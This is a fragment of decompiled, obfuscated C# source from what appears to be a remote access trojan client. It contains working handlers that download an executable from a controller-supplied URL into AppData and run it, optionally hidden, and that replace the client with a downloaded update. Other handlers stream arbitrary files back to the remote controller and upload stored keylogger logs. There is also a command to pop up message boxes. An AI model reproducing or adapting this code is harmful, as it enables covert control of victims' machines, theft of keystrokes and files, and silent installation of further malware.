	// Token: 0x06000184 RID: 388 RVA: 0x00002B51 File Offset: 0x00000D51
	[CompilerGenerated]
	private static string smethod_35(string formattedKeyValue)
	{
		return "4" + formattedKeyValue;
	}

	// Token: 0x06000185 RID: 389 RVA: 0x00002B5E File Offset: 0x00000D5E
	[CompilerGenerated]
	private static string smethod_36(string formattedKeyValue)
	{
		return "5" + formattedKeyValue;
	}

	// Token: 0x06000186 RID: 390 RVA: 0x00002B6B File Offset: 0x00000D6B
	[CompilerGenerated]
	private static bool smethod_37(FileInfo file)
	{
		return file.Name != "desktop.ini";
	}

	// Token: 0x06000187 RID: 391 RVA: 0x00002B7D File Offset: 0x00000D7D
	[CompilerGenerated]
	private static string smethod_38(FileInfo file)
	{
		return string.Format("{0}||{1}", file.Name, file.FullName);
	}

	// Token: 0x06000188 RID: 392 RVA: 0x00002B95 File Offset: 0x00000D95
	[CompilerGenerated]
	private static string smethod_39(string formattedKeyValue)
	{
		return "6" + formattedKeyValue;
	}

	// Token: 0x04000092 RID: 146
	private const string string_0 = "$E$";

	// Token: 0x04000093 RID: 147
	public static UnsafeStreamCodec unsafeStreamCodec_0;

	// Token: 0x04000094 RID: 148
	private static Shell shell_0;

	// Token: 0x04000095 RID: 149
	private static Dictionary<int, string> dictionary_0 = new Dictionary<int, string>();

	// Token: 0x04000096 RID: 150
	private static readonly Semaphore semaphore_0 = new Semaphore(2, 2);

	// Token: 0x04000097 RID: 151
	[CompilerGenerated]
	private static Func<DriveInfo, bool> func_0;

	// Token: 0x04000098 RID: 152
	[CompilerGenerated]
	private static Func<string, string> func_1;

	// Token: 0x04000099 RID: 153
	[CompilerGenerated]
	private static Func<string, string> func_2;

	// Token: 0x0400009A RID: 154
	[CompilerGenerated]
	private static Func<string, string> func_3;

	// Token: 0x0400009B RID: 155
	[CompilerGenerated]
	private static Func<string, string> func_4;

	// Token: 0x0400009C RID: 156
	[CompilerGenerated]
	private static Func<string, string> func_5;

	// Token: 0x0400009D RID: 157
	[CompilerGenerated]
	private static Func<string, string> func_6;

	// Token: 0x0400009E RID: 158
	[CompilerGenerated]
	private static Func<FileInfo, bool> func_7;

	// Token: 0x0400009F RID: 159
	[CompilerGenerated]
	private static Func<FileInfo, string> func_8;

	// Token: 0x040000A0 RID: 160
	[CompilerGenerated]
	private static Func<string, string> func_9;

	// Token: 0x02000032 RID: 50
	[CompilerGenerated]
	private sealed class Class0
	{
		// Token: 0x0600018B RID: 395 RVA: 0x0000AB58 File Offset: 0x00008D58
		public void method_0()
		{
			new SetStatus("Downloading file...").Execute(this.client_0);
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), GClass4.smethod_0(12, ".exe"));
			try
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.Proxy = null;
					webClient.DownloadFile(this.doClientUpdate_0.DownloadURL, text);
				}
			}
			catch
			{
				new SetStatus("Download failed!").Execute(this.client_0);
				return;
			}
			new SetStatus("Updating...").Execute(this.client_0);
			GClass15.smethod_0(this.client_0, text);
		}

		// Token: 0x040000A1 RID: 161
		public DoClientUpdate doClientUpdate_0;

		// Token: 0x040000A2 RID: 162
		public Client client_0;
	}

	// Token: 0x02000033 RID: 51
	[CompilerGenerated]
	private sealed class Class1
	{
		// Token: 0x0600018D RID: 397 RVA: 0x00002BBA File Offset: 0x00000DBA
		public void method_0(string msg)
		{
			this.bool_0 = true;
			this.string_0 = msg;
		}

		// Token: 0x040000A3 RID: 163
		public bool bool_0;

		// Token: 0x040000A4 RID: 164
		public string string_0;
	}

	// Token: 0x02000034 RID: 52
	[CompilerGenerated]
	private sealed class Class2
	{
		// Token: 0x0600018F RID: 399 RVA: 0x0000AC18 File Offset: 0x00008E18
		public void method_0()
		{
			GClass17.semaphore_0.WaitOne();
			try
			{
				GClass23 gclass = new GClass23(this.doDownloadFile_0.RemotePath);
				if (gclass.MaxBlocks < 0)
				{
					new DoDownloadFileResponse(this.doDownloadFile_0.ID, "", new byte[0], -1, -1, gclass.LastError).Execute(this.client_0);
					GClass17.semaphore_0.Release();
					return;
				}
				int i = 0;
				while (i < gclass.MaxBlocks)
				{
					if (this.client_0.Connected && !GClass17.dictionary_0.ContainsKey(this.doDownloadFile_0.ID))
					{
						byte[] block;
						if (gclass.method_1(i, out block))
						{
							new DoDownloadFileResponse(this.doDownloadFile_0.ID, Path.GetFileName(this.doDownloadFile_0.RemotePath), block, gclass.MaxBlocks, i, gclass.LastError).Execute(this.client_0);
							i++;
							continue;
						}
						new DoDownloadFileResponse(this.doDownloadFile_0.ID, "", new byte[0], -1, -1, gclass.LastError).Execute(this.client_0);
					}
					break;
				}
			}
			catch (Exception ex)
			{
				new DoDownloadFileResponse(this.doDownloadFile_0.ID, "", new byte[0], -1, -1, ex.Message).Execute(this.client_0);
			}
			GClass17.semaphore_0.Release();
		}

		// Token: 0x040000A5 RID: 165
		public DoDownloadFile doDownloadFile_0;

		// Token: 0x040000A6 RID: 166
		public Client client_0;
	}

	// Token: 0x02000035 RID: 53
	[CompilerGenerated]
	private sealed class Class3
	{
		// Token: 0x06000191 RID: 401 RVA: 0x00002BCA File Offset: 0x00000DCA
		public void method_0(string msg)
		{
			this.bool_0 = true;
			this.string_0 = msg;
		}

		// Token: 0x040000A7 RID: 167
		public bool bool_0;

		// Token: 0x040000A8 RID: 168
		public string string_0;
	}

	// Token: 0x02000036 RID: 54
	[CompilerGenerated]
	private sealed class Class4
	{
		// Token: 0x06000193 RID: 403 RVA: 0x00002BDA File Offset: 0x00000DDA
		public void method_0(string msg)
		{
			this.bool_0 = true;
			this.string_0 = msg;
		}

		// Token: 0x040000A9 RID: 169
		public bool bool_0;

		// Token: 0x040000AA RID: 170
		public string string_0;
	}

	// Token: 0x02000037 RID: 55
	[CompilerGenerated]
	private sealed class Class5
	{
		// Token: 0x06000195 RID: 405 RVA: 0x0000AD94 File Offset: 0x00008F94
		public void method_0()
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), GClass4.smethod_0(12, ".exe"));
			try
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.Proxy = null;
					webClient.DownloadFile(this.doDownloadAndExecute_0.URL, text);
				}
			}
			catch
			{
				new SetStatus("Download failed!").Execute(this.client_0);
				return;
			}
			new SetStatus("Downloaded File!").Execute(this.client_0);
			try
			{
				GClass4.smethod_2(text);
				byte[] array = File.ReadAllBytes(text);
				if (array[0] != 77 && array[1] != 90)
				{
					throw new Exception("no pe file");
				}
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				if (this.doDownloadAndExecute_0.RunHidden)
				{
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
				}
				processStartInfo.UseShellExecute = this.doDownloadAndExecute_0.RunHidden;
				processStartInfo.FileName = text;
				Process.Start(processStartInfo);
			}
			catch
			{
				GClass26.DeleteFile(text);
				new SetStatus("Execution failed!").Execute(this.client_0);
				return;
			}
			new SetStatus("Executed File!").Execute(this.client_0);
		}

		// Token: 0x040000AB RID: 171
		public DoDownloadAndExecute doDownloadAndExecute_0;

		// Token: 0x040000AC RID: 172
		public Client client_0;
	}

	// Token: 0x02000038 RID: 56
	[CompilerGenerated]
	private sealed class Class6
	{
		// Token: 0x06000197 RID: 407 RVA: 0x0000AEDC File Offset: 0x000090DC
		public void method_0()
		{
			MessageBox.Show(this.doShowMessageBox_0.Text, this.doShowMessageBox_0.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), this.doShowMessageBox_0.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), this.doShowMessageBox_0.MessageboxIcon), MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
		}

		// Token: 0x040000AD RID: 173
		public DoShowMessageBox doShowMessageBox_0;
	}

	// Token: 0x02000039 RID: 57
	[CompilerGenerated]
	private sealed class Class7
	{
		// Token: 0x06000199 RID: 409 RVA: 0x0000AF4C File Offset: 0x0000914C
		public void method_0()
		{
			try
			{
				int num = 1;
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
				if (!Directory.Exists(path))
				{
					new GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", num, 0).Execute(this.client_0);
				}
				else
				{
					FileInfo[] files = new DirectoryInfo(path).GetFiles();
					if (files.Length == 0)
					{
						new GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", num, 0).Execute(this.client_0);
					}
					else
					{
						foreach (FileInfo fileInfo in files)
						{
							GClass23 gclass = new GClass23(fileInfo.FullName);
							if (gclass.MaxBlocks < 0)
							{
								new GetKeyloggerLogsResponse("", new byte[0], -1, -1, gclass.LastError, num, files.Length).Execute(this.client_0);
							}
							for (int j = 0; j < gclass.MaxBlocks; j++)
							{
								byte[] block;
								if (gclass.method_1(j, out block))
								{
									new GetKeyloggerLogsResponse(Path.GetFileName(fileInfo.Name), block, gclass.MaxBlocks, j, gclass.LastError, num, files.Length).Execute(this.client_0);
								}
								else
								{
									new GetKeyloggerLogsResponse("", new byte[0], -1, -1, gclass.LastError, num, files.Length).Execute(this.client_0);
								}
							}
							num++;
						}
					}
				}
			}
			catch (Exception ex)
			{
				new GetKeyloggerLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(this.client_0);
			}
		}

		// Token: 0x040000AE RID: 174
		public Client client_0;
	}
}
